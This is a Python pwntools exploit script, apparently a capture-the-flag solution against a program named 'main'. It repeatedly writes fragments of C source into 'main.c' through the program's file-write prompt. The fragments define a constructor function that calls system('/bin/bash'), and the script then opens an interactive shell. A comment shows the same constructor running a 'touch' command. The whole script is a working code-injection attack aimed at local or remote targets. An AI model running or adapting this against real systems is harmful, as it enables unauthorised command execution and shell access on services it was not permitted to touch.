#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('main')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    # call as a constructor: int pwn(void)__attribute__((constructor));int pwn(void){system("touch /tmp/a.txt");return 0;}
    values = ['int pwn(void)', '__attribute__', '((constructor));', 'int pwn(void){', 'system("/bin/bash");', 'return 0;}']

    for i in range(len(values)):
        sleep(1)
        print(f'[*] Sending -> {values[i]}')
        init()
        io.recvuntil("name?")
        io.sendline("main.c")
        io.recvuntil("(W)?")
        io.sendline("W")
        io.recvuntil("Contents?")
        io.sendline(values[i])
        

    io.interactive()

def main():
    
    solve()


if __name__ == '__main__':
    main()
